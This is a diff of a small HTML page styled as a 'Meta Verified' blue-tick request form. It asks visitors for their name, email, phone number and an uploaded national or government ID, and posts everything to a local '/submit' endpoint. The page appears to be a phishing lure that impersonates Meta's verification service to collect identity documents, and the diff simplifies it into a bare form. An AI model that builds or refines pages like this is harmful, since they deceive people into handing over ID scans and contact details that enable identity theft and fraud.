@@ -1,47 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Meta Verified Request</title>
-  <style>
-    body { font-family: Arial; background: #f0f2f5; }
-    .container {
-      max-width: 500px; margin: 40px auto;
-      background: white; padding: 25px;
-      border-radius: 10px; box-shadow: 0px 0px 10px #ccc;
-    }
-    h2 { text-align: center; color: #1877f2; }
-    label { font-weight: bold; margin-top: 10px; display: block; }
-    input { width: 100%; padding: 10px; margin-top: 5px; }
-    button {
-      width: 100%; background: #1877f2;
-      color: white; padding: 12px; border: none;
-      margin-top: 20px; border-radius: 5px;
-    }
-  </style>
+    <title>Meta Verified Form</title>
 </head>
 <body>
-  <div class="container">
-    <h2>Meta Verified</h2>
-    <form action="/submit" method="POST" enctype="multipart/form-data">
-      <label>Full Name</label>
-      <input type="text" name="name" required />
+    <h2>Meta Verified Blue Tick Form</h2>
+    <form action="/submit" method="post" enctype="multipart/form-data">
+        <label>Full Name:</label><br>
+        <input type="text" name="name" required><br><br>
 
-      <label>Facebook Profile URL</label>
-      <input type="url" name="fb_url" required />
+        <label>Email:</label><br>
+        <input type="email" name="email" required><br><br>
 
-      <label>Email Address</label>
-      <input type="email" name="email" required />
+        <label>Phone Number:</label><br>
+        <input type="text" name="phone" required><br><br>
 
-      <label>Phone Number</label>
-      <input type="text" name="phone" required />
+        <label>NID Upload:</label><br>
+        <input type="file" name="nid" required><br><br>
 
-      <label>Upload Government ID</label>
-      <input type="file" name="gov_id" accept=".jpg,.png,.pdf" required />
-
-      <button type="submit">Submit</button>
+        <input type="submit" value="Submit">
     </form>
-  </div>
 </body>
-                           </html>
+</html>
